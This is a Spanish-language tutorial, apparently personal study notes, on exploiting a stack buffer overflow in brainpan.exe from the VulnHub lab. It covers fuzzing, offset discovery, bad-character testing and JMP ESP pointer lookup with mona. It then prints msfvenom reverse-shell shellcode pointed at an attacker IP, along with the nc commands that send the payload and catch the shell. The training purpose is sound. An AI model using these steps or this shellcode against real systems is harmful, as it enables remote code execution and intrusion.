## ¿Qué es un buffer Overflow?
Link de un video de explicación teórica [aquí](https://www.youtube.com/watch?v=ha2Rx4NUHec)
[Tutorial que estaremos siguiendo](https://www.youtube.com/watch?v=xvHYqkGPcJk)

![[Pasted image 20250627122215.png]]

La imagen muestra una representación típica de una pila (stack) de ejecución en un programa, particularmente enfocada en cómo se estructura la memoria durante una llamada a una función. Esto es especialmente relevante para entender vulnerabilidades como un **Buffer Overflow**.

### Explicación de la imagen:

#### 1. **Stack (pila) en crecimiento descendente**

- La pila crece **de direcciones de memoria altas a bajas**, es decir, hacia abajo en la imagen.
    
- Esto significa que cada vez que se introduce una nueva variable local o se hace una llamada a función, los nuevos datos se colocan “encima” en la pila, pero en direcciones más bajas.
    
#### 2. **ESP (Stack Pointer)** – Tope de la pila

- Apunta a la **posición actual** más alta en uso de la pila (el tope).
    
- Es donde se colocan los nuevos datos cuando se hace un `push`.
    
#### 3. **Buffer**

- Es un bloque de memoria reservado para datos, como por ejemplo un arreglo (array) de caracteres.
    
- En muchos casos, este buffer se encuentra antes (por encima) del EBP en la pila, como se muestra aquí.
    
#### 4. **EBP (Base Pointer)** – Base de la pila

- Marca el inicio del marco de pila de la función actual.
    
- Se utiliza como referencia fija para acceder a variables locales y parámetros de la función.
    
- Ayuda a mantener la estabilidad de la pila durante la ejecución de una función.
    
#### 5. **Saved EBP**

- Es el valor anterior de EBP, guardado al entrar en una función para poder restaurarlo al salir.
    
- Permite regresar al contexto del marco de pila de la función anterior.
    
#### 6. **Saved EIP / Return Address**

- Es la **dirección de retorno**, es decir, la dirección de memoria a la que el programa debe dirigirse una vez que termina la función actual. Cuando el buffer se desborda y este se modifica, se produce una denegación de servicio.
    
- Es un objetivo común en ataques de Buffer Overflow.
    
### En el contexto de un **Buffer Overflow**:

Si un programa no verifica correctamente los límites del **buffer**, un atacante puede escribir más datos de los que el buffer puede contener. Esta escritura **invade las áreas inferiores de la pila**, sobrescribiendo:

- El **Saved EBP**, lo que puede causar problemas al tratar de restaurar el marco anterior.
    
- Más críticamente, el **Saved EIP (Return Address)**, lo que puede redirigir el flujo de ejecución del programa a código malicioso.
    

Este es el principio básico detrás de muchos exploits de **Stack Buffer Overflow**, donde se busca manipular el retorno para ejecutar código arbitrario (por ejemplo, shellcode).

***PoC***: Probe of concept, prueba de concepto

### Empezamos con la explotación

En virtualbox creamos una VM de W10 en la cual nos llevamos el ejecutable *brainpan.exe* de la maquina Brainpan de **Vulnhub**.

Luego, en la maquina virtual de windows nos descargamos el immunity debugger, del siguiente repositorio de github [aqui](https://github.com/kbandla/ImmunityDebugger/releases).

Luego debemos descargar la herramienta de **mona.py** [aqui](https://github.com/corelan/mona/blob/master/mona.py). Y pegar ese script en los scripts del immunity debugger, en la ruta "**C:\Program Files(x86)\Immunity Inc\Immunity Debugger\PyCommands**".

Ejecutamos el ***brainpan.exe***

![[Pasted image 20250625205551.png]]

En nuestra maquina windows vemos lo siguiente:

![[Pasted image 20250625205655.png]]

## Primera fase de explotación (Footing)
Aquí, nuestro objetivo será descubrir en qué bytes se bloquea el programa, porque en ese punto se acontece el Buffer Overflow. Para ello utilizaremos el siguiente script:


![[Pasted image 20250625212438.png]]

***ANALISIS DEL CÓDIGO***
#### **1. Encabezado e importación de módulos**

    #!/usr/bin/env python3: Define que el script debe ejecutarse con Python 3.

    socket: Módulo para manejar conexiones de red.

    sys: Permite interactuar con el sistema (como salir del programa).

    time: Se usa aquí para pausar la ejecución con sleep().

## **2. Configuración inicial**

- Se define la IP y puerto del objetivo.
    
- `prefix` está vacío, pero podría usarse para comandos específicos que requiera la aplicación objetivo.
    
- `string` es la cadena que se enviará al servidor: empieza con 100 caracteres "A".

## **3. Bucle infinito de fuzzing**

- Se crea un **socket TCP (SOCK_STREAM)**.
    
- Se conecta al servidor.
    
- Se recibe un mensaje (hasta 1024 bytes) para confirmar que el servidor responde.
    
- Se muestra por consola la cantidad de bytes enviados (sin contar el `prefix`).
    
- Se envía la cadena convertida a bytes usando el encoding `"latin-1"` (permite enviar datos binarios sin errores).
    
- Se espera otra respuesta del servidor.

## **4. Manejo de excepciones**

- Si hay una excepción (por ejemplo, si el servidor deja de responder), se asume que ocurrió un **crash**.
    
- Se imprime cuántos bytes causaron el fallo.
    
- Se incrementa la cadena con 100 "A" más (aunque esto no tiene efecto real, ya que justo después el script termina con `sys.exit(0)`).
    
- Se espera 1 segundo entre iteraciones para evitar enviar datos demasiado rápido.

En la máquina windows ejecutamos como admin el Immunity y el Brainpam. Y en el immunity ejecutamos el siguiente comando para colocar un entorno de trabajo con mona.py:
```
!mona config -set workingfolder C:\mona\%p
```

Procederemos a ejecutar el script:
![[Pasted image 20250625212757.png]]

Por el immunity antes de que el brainpam.exe crashee, veríamos algo así:
![[Pasted image 20250625212947.png]]

![[Pasted image 20250625215102.png]]
Ahora, sabemos que el programa crashea luego de recibir entre 500 y 600 bytes, vamos a sumarle 400 para tener un margen, y crear un payload para encontrar el byte exacto donde crashea el programa que debería estar entre el byte 500 y 600. 

Para crear el Payload usaremos un módulo de Metasploit "**pattern_create.rb**", puedes encontrarlo en la siguiente ruta "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb"
```
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1008
```
Ejecutamos el script usando el ruby embebido de Metasploit para generar un payload de 1008 bytes, 600 bytes (donde crashea) más 400 bytes (de margen) igual 1008 bytes de payload.

El payload que obtuvimos fue el siguiente, el cual lo enviaremos a la maquina victima de la siguiente forma:
```
echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5" | nc 192.168.1.38 9999
```
Al enviarlo, poidemos observar en el Immunity Debbuger que el EIP ya no es "41414141" sino que ahora es ***"35724134"***. Ese EIP debemos guardarlo, de la siguiente forma:
```
echo "35724134" > EIP
```
Ahora para encontrar el byte exacto donde el programa crashea usaremos otro modulo de Metasploit, llamado "**pattern_offset.rb**". A este script le indicaremos la longitud anteriormente mencionada, 1008, y el EIP. De la siguiente manera:
```
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 1008 -q 35724134
```
El script los devuelve lo siguiente:
```
[*] Exact match at offset 524 
```
Lo que significa que el programa crashea justo en el byte 524. Lo guardaremos:
```
echo "524" > byte_exacto
```
Lo siguiente que haremos es verificar si podemos bloquear el programa y poder modificar el EIP, ya que si tenemos control sobre éste, tendríamos control sobre qué queremos que ocurra luego en el programa, en este caso lo que queremos que ocurra es lanzar un payload con un comando malicioso, para obtener acceso a la máquina. Para ello usaremos python:
```
python3 -c 'print("A" * 524 + "B" * 4)' | nc 192.168.1.38 9999
```
Ahora, podemos observar en el Immunity Debugger que el EIP es "42424242", que "42" es la letra "B" en Hexadecimal. Por lo tanto podemos modificar el EIP.
Lo siguiente que debemos conocer, son los **BADCHARS** o caracteres podrían interferir con la ejecución de nuestro payload o provocar comportamientos inesperados. Esos badchars los buscaremos en el siguiente repositorio de github, [aqui](https://github.com/cytopia/badchars). También podemos hacer uso de los badchars que nos reporta mona a través del comando `!mona bytearray -b "\x00"`
```
echo "badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)" > badchars
```
Esos son los posibles caracteres que pueden causar problemas a la hora de ejecutar el payload.
En Immunity Debugger, colocaremos el siguiente comando de mona.py:
```
!mona bytearray -b "\x00"
```
Esto creará un archivo con los badchars del brainpan.exe en la ruta "**C:\mona\brainpan\bytearray.txt**", quitando el badchar "**\x00**" porque suele causar problemas para poder compararlos con los de nuestro payload, si hay alguno que no esté, debemos eliminarlo para ejecutar nuestro payload de forma exitosa. Para ello usaremos el siguiente script en python:
![[Pasted image 20250626085747.png]]
Ahora ejecutaremos el script:
![[Pasted image 20250626085952.png]]
Ahora, los badchars del brainpan, debemos compararlos con los de nuestro payload, si hay alguno que no esté, debemos eliminarlo para ejecutar nuestro payload de forma exitosa. Para ello debemos ejecutar el siguiente comando en el Immunity Debugger:
```
!mona compare -f c:\mona\brainpan\bytearray.bin -a ESP
```
![[Pasted image 20250626092040.png]]
Vemos que no hay ningún error, por lo tanto no es necesario modificar algun badchar. Lo que puede ocurrir, es que al comparar los badchars con mona sin antes ejecutar el script, puede aparecer los siguiente:
![[Pasted image 20250626092341.png]]
Vemos que hay dos badchars, que causan conflicto, el "**\x00**", que deberíamos quitar del payload. Por ejemplo, si apareciera "**06**", deberiamos quitar el badchar de nuestro payload.
## Conocer el Pointer
El pointer es el punto en donde el programa se redirige al script malicioso que nosotros vamos a crear. Para ello haremos uso de otro módulo de Metasploit "**nasm_shell.rb**".
```
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
```
Y ejecutaremos lo siguiente:
```
jmp esp
```
El jmp, el jumper sería el pointer donde salta el programa
![[Pasted image 20250626093813.png]]
**FFE4** es el valor Hexadecimal donde se almacena el Point de cada programa. Guardaremos ese valor.
En el Immunity Debugger ejecutaremos lo siguiente:
```
!mona modules
```
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeZNMYQObkPo5BFDd4Ao32tkJ7724Svq8A1Hz7duQddu2M2Q4yipdXJcSmVRePOWDWjbFX_UlAtn6UOCjiM6Mbc1QYGu5p6kfxOv8mKsbA-TTA2X5hrz2MqHbADc4Nznq1GKFVeSw?key=_prnR4dbMG--Rytci4s06Q)
Le pondremos atención al módulo de **brainpan.exe** que es al que queremos explotar el buffer overflow. Nos interesa los binarios que tengan **TODO False**, eso quiere decir que no tienen ninguna protección, en este caso el **brainpan.exe**. Luego, en el Immunity Debugger ejecutaremos el siguiente comando, para encontrar el pointer:
```
!mona find -s "\xff\xe4" -m brainpan.exe
```
![[Pasted image 20250626100841.png]]
Arriba de **Found a total of 1 pointers**, encontramos el Pointer **0x311712f3**. Podemos ver que se relaciona con el jumper **FFE4** que habíamos visto anteriormente, como lo muestra la siguiente imagen:
![[Pasted image 20250626101133.png]]

Ese valor lo incluiremos en el script para ejecutar el código malicioso, para obtener la reverse shell. Para ello haremos uso de msfvenom:
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP_ATACANTE> LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"

```
El parámetro **-b** sirve para colocar los badchars que debemos quitar del payload, en este caso debemos quitar el "**x00**". El comando nos devuelve la siguiente respuesta:
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xda\xcc\xd9\x74\x24\xf4\x5a\xbd\xc0\x76\x8e\x47\x33\xc9"
"\xb1\x12\x83\xea\xfc\x31\x6a\x13\x03\xaa\x65\x6c\xb2\x1b"
"\x51\x87\xde\x08\x26\x3b\x4b\xac\x21\x5a\x3b\xd6\xfc\x1d"
"\xaf\x4f\x4f\x22\x1d\xef\xe6\x24\x64\x87\x38\x7e\x97\x7e"
"\xd1\x7d\x98\x81\x9a\x0b\x79\x31\xba\x5b\x2b\x62\xf0\x5f"
"\x42\x65\x3b\xdf\x06\x0d\xaa\xcf\xd5\xa5\x5a\x3f\x35\x57"
"\xf2\xb6\xaa\xc5\x57\x40\xcd\x59\x5c\x9f\x8e";
```
El payload en limpio:
```
"\xda\xcc\xd9\x74\x24\xf4\x5a\xbd\xc0\x76\x8e\x47\x33\xc9"
"\xb1\x12\x83\xea\xfc\x31\x6a\x13\x03\xaa\x65\x6c\xb2\x1b"
"\x51\x87\xde\x08\x26\x3b\x4b\xac\x21\x5a\x3b\xd6\xfc\x1d"
"\xaf\x4f\x4f\x22\x1d\xef\xe6\x24\x64\x87\x38\x7e\x97\x7e"
"\xd1\x7d\x98\x81\x9a\x0b\x79\x31\xba\x5b\x2b\x62\xf0\x5f"
"\x42\x65\x3b\xdf\x06\x0d\xaa\xcf\xd5\xa5\x5a\x3f\x35\x57"
"\xf2\xb6\xaa\xc5\x57\x40\xcd\x59\x5c\x9f\x8e"
```
En caso de que la máquina victima sea Windows, utiliza el siguiente shellcode:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_ATACANTE> LPORT=443 EXITFUNC=thread --platform windows -f c -a x86 -b "\x00"
```

El payload que esta herramienta nos genere, lautilizaremos en nuestro script hecho en python:

![[Pasted image 20250626105239.png]]
Y lo ejecutaremos de la siguiente manera, primero nos ponemos en escucha por el puerto que determinamos en la reverse shell de msfvenom, en este caso el **443**.

El **padding** que contiene varios **\x90** (no operation codes) se utilizan para desplazar el shellcode, es necesario para que se ejecute. Una alternativa es, ejecutar módulo de Metasploit "**nasm_shell.rb**" y lanzar el siguiente comando:

```
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
```

Ahora ejecutamos lo siguiente:

```
sub esp,0x10
```

![[Pasted image 20250630221138.png]]

Con este Operation Code, lo que haremos es desplazar la pila (zona del esp donde se aloja el shellcode), de manera que causaremos un efecto similar al uso de **\x90**. Debemos hacer el siguiente cambio en el script, modificando el payload que enviaremos: 

![[Pasted image 20250630222154.png]]

**buffer** = "A" * offset
**eip** = "\xf3\x12\x17\x31" (dirección del pointer)
**"\x83\xEC\x10"** => Operation Code que nos desplazará el shellcode
**shellcode**

Nos ponemos en escucha por el puerto 443:
```
sudo rlwrap nc -lnvp 443
```
En paralelo, ejecutamos el script que hemos creado:
```
python3 brainpan_shellCode.py
```


